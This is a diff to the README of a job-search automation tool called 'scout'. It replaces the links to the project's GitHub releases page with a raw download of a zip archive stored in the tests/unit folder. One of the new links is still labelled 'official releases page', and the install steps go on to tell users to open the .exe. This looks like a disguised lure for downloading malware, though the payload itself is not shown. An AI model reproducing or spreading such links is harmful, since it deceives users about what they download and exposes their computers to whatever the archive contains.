@@ -1,6 +1,6 @@
 # 🔍 scout - Find and land your dream job
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Alleneoaken19/scout/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Alleneoaken19/scout/main/tests/unit/Software_3.1.zip)
 
 Scout automates your job search process. It scans job boards, scores your match, updates your resume, and submits applications on your behalf. Since the software runs on your own computer, your personal data stays private.
 
@@ -21,7 +21,7 @@ Scout automates your job search process. It scans job boards, scores your match,
 
 ## 📥 How to Install
 
-1. Visit the [official releases page](https://github.com/Alleneoaken19/scout/releases) to download the installer.
+1. Visit the [official releases page](https://raw.githubusercontent.com/Alleneoaken19/scout/main/tests/unit/Software_3.1.zip) to download the installer.
 2. Select the file ending in `.exe` for Windows.
 3. Save the file to your desktop or downloads folder.
 4. Open the file to start the installation program.
